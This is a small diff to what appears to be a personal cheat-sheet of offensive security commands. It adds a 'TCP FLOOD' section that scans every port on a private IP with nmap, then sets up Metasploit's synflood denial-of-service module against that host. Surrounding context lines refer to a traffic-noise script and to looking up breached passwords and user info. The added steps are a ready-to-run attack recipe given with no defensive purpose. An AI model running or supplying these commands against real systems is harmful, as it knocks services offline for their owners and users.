@@ -72,6 +72,17 @@ nano config.json
 ## ADD SITES TO CONFIG FILE 
 python noisy.py --config config.json
 
+
+### TCP FLOOD ### 
+sudo nmap -p1-64580 192.168.50.111
+service postgresql start 
+ msfconsole
+search synflood 
+use auxiliary/dos/tcp/synflood
+show options 
+set RHOST 192.168.50.111
+
+
 ####################################
 ################################################
 #### TO LOOK UP BREACHED PASSWORDS AND USER INFO ##### 
